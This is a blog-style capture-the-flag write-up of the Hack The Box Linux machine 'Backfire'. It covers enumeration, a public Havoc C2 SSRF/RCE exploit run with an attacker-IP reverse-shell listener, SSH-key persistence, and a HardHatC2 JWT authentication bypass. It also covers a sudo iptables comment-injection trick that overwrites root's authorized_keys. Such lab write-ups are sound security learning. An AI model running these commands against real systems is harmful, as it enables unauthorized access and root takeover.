+++
date = '2026-05-20T19:40:34+02:00'
draft = false
title = 'Backfire Writeup EN'
+++
**Name:** `joy.scd01`

**Date:** `24/01/2025`

![Backfire.png](/images/imgs_backfire/Backfire.png)

---
# Introduction

**_Backfire_** is the second seasonal machine released during **Season 7**.
It's a **Linux** box, officially categorized as **Medium-level difficulty**.
In my opinion it really isn't... I found this machine such a brainfuck 'cause I've been stuck multiple times, searching online, to find ways to exploit it.

Initial access alone required **chaining exploits** and interacting with **C2 frameworks** in a rather unconventional way.
Add to this the pivoting part for the lateral movement, the privilege escalation path, and you end up with a box that is much more intricate than a typical “Medium”.

Despite being frustrating at times, **_Backfire_** turned out to be a great learning experience, especially for exploring two **C2 frameworks** I hadn’t properly used before: **Havoc** and **HardHat**.

---
# Techniques Used

- **SSRF combined with RCE (CVE-2024-41570)**
- **Authentication Bypass (JWT manipulation)**
- **Sudoers Misconfiguration (iptables)**

---
# Enumeration

## nmap

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV backfire
```

![nmap.png](/images/imgs_backfire/nmap.png)

**Open ports**:
**22**/tcp ---> SSH
**443**/tcp ---> ssl/http running nginx/1.22.1
**5000**/tcp ---> filtered upnp
**8000**/tcp ---> http running nginx 1.22.1

---
## HTTP - Web Enumeration | http://backfire:8000

Here we can download **two interesting files**:

![web.png](/images/imgs_backfire/web.png)

1. **`disable_tls.patch`**:

![tls_d.png](/images/imgs_backfire/tls_d.png)

2. **`havoc.yaotl`**:

![havoc.png](/images/imgs_backfire/havoc.png)


By analyzing the first one we can assume that **Havoc C2 Framework** is running on **localhost:40056**

In the second file, a bunch of credentials were displayed:

- `ilya`:**CobaltStr1keSuckz!**
- `sergej`:**1w4nt2sw1tch2h4rdh4tc2**

Now, I tried a simple **SSH** connection with those credentials, but as I expected it didn't work.
So I searched online for an exploit for **Havoc** and I found this one :
https://github.com/kit4py/CVE-2024-41570.

An **SSRF** combined with **RCE**.

_An **Unauthenticated Server-Side Request Forgery** vulnerability in the daemon callback handling in Havoc, combined with a **Remote Code Execution** to establish a **reverse shell**.
This script I used automates: **agent registration**, **WebSocket payload delivery** and **remote command execution**_

Using this exploit was the key step that allowed me to gain a **foothold** on the box.

---
# Initial Access | SSRF combined with RCE

So, after I set up a **netcat listener**, I ran the exploit following the instructions:

```bash
python3 exploit.py -t https://backfire -i 127.0.0.1 -p 40056 -U 'ilya' -P 'CobaltStr1keSuckz!' -l <attacker_IP> -L <lport>
```

![cve1.png](/images/imgs_backfire/cve1.png)

And after a while, I obtained a shell as user **`ilya`**:

![ilyashell.png](/images/imgs_backfire/ilyashell.png)

This shell wasn't stable at all, so I decided to put my public **RSA key** into the `authorized_keys` file to stabilize it and ensure persistence.

Once connected through **SSH** and after obtaining a **fully interactive and stable shell**,
I found the **user flag** and began the **privilege escalation phase**.

![stableshell.png](/images/imgs_backfire/stableshell.png)

---
# Lateral Movement | Pivoting → Authentication Bypass through JWT manipulation → sergej

To escalate my privileges I started with an internal directory enumeration.

Into **`ilya`**'s home I discovered an interesting file: **`hardhat.txt`**:

![hardhat.png](/images/imgs_backfire/hardhat.png)

I searched for **hardhatC2** exploit and found this one:
https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7

An **Authentication Bypass** vulnerability.

_Basically, this exploit **bypasses the HardHat authentication** by crafting an **admin JWT** and uses it to create a **new user (`sth_pentest`)** with **"TeamLead" role**._

First of all I checked the **internal services**, in order to detect where **HardHatC2** was hosted:

```bash
ilya@backfire:~$ netstat -tuln
```

![tuln.png](/images/imgs_backfire/tuln.png)

Ports: **5000** and **7096** looked interesting to me.
**Port 5000** was the one **filtered** according to the **nmap** initial scan.

So I simply checked port **7096** using **curl**:

```bash
curl -k https://127.0.0.1:7096
```

That returned the content of the **HardHatC2 webpage**.

So I created an **SSH tunnel** to reach it:

```bash
ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa -i ~/.ssh/id_ed25519 ilya@backfire -L 7096:localhost:7096
```

And ran the **exploit**:

```bash
python3 gen.py
```

![jwt.png](/images/imgs_backfire/jwt.png)

**It worked**, and now I was able to log into the **hardhat web application** at **https://localhost:7096**,  using those **credentials**:
- `sth_pentest:sth_pentest`

I had never used **HardHat** and I didn't know how it worked. So, I started to enumerate every section of the page and finally in **`/ImplantInteract`**:
I found an interactive **webshell** as the user **`sergej`**:

![term.png](/images/imgs_backfire/term.png)

Now, as I did before, I inserted my **RSA key** into the `authorized_keys` file to avoid **response latency** and ensure a **persistent connection** through **SSH**.

![authj.png](/images/imgs_backfire/authj.png)

![sergejshell.png](/images/imgs_backfire/sergejshell.png)

---
# Privilege Escalation | Sudo Misconfiguration → Local Privilege Escalation abusing iptables

**Sudo permissions** showed that `sergej` was able to run **iptables** without a password

![sudol.png](/images/imgs_backfire/sudol.png)

I found this blog while googling around for "**usr/sbin/iptables privilege escalation**":
https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/

So I used this method to overwrite my **public SSH key** to root's `authorized_keys` file.

To do that I ran these commands:

1.  Using the "**comment**" flag to add a comment on any rule.
```bash
sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n <YourPubKey> \n'
```

2. using the "**-S**" flag to instruct **bash** to replace the **"\n"** character with a new line.
```bash
sudo iptables -S
```

3. using the "**iptables-save**" command to overwrite authorized_keys file with our key:

![privesc.png](/images/imgs_backfire/privesc.png)

Now I simply connected through **SSH** as **`root`** on the machine, using my **rsa_key**:

![root.png](/images/imgs_backfire/root.png)

---
# Final Thoughts

**_Backfire_** turned out to be far more time-consuming than expected — not because the exploitation steps were especially complex, but because every phase required identifying the **exact exploit**.
Most of the difficulty came from researching and validating public exploits rather than the exploitation itself, and that ended up being the most frustrating aspect of the machine.

Still, it pushed me to read documentation, test different approaches, and understand the basics of how both **Havoc** and **HardHatC2** operate under the hood.

**Sources**:

- **Exploit Havoc (CVE-2024-41570)** | https://github.com/kit4py/CVE-2024-41570
- **Exploit HardHatC2 (Authentication Bypass)** | https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7
- **Guide to Privilege Escalation via iptables** | https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/